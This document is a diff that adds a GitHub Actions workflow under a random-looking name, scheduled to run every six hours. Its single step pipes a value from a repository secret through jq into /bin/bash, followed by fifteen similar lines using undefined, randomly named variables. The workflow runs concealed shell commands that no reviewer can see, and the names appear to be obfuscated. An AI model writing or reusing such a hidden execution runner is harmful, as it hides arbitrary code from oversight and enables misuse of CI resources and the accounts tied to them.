@@ -1,0 +1,31 @@
+name: kanzhedilonon
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kanzhedilonon
+        env:
+          fw24948: ${{ secrets.fw24948 }}
+        run: |
+          echo $fw24948 | jq -r .aje6207 | /bin/bash
+          echo $cyoau07 | jq -r .irimw9836 | /bin/bash
+          echo $eugi7118 | jq -r .mg85365 | /bin/bash
+          echo $mvggu03 | jq -r .wxoq4361 | /bin/bash
+          echo $jmtjl65 | jq -r .wv6206 | /bin/bash
+          echo $b7 | jq -r .zyw08 | /bin/bash
+          echo $ayhma072 | jq -r .brvrf8962 | /bin/bash
+          echo $pu6 | jq -r .vbw1 | /bin/bash
+          echo $bfmbj05886 | jq -r .durjq7544 | /bin/bash
+          echo $ydfil7 | jq -r .vpfy39 | /bin/bash
+          echo $lk4532 | jq -r .dq98 | /bin/bash
+          echo $hkleg23 | jq -r .doypl977 | /bin/bash
+          echo $zr77 | jq -r .aorz6 | /bin/bash
+          echo $rz1376 | jq -r .fhz894 | /bin/bash
+          echo $ngy32599 | jq -r .jm03 | /bin/bash
+          echo $ifvf923 | jq -r .pdx92 | /bin/bash
+
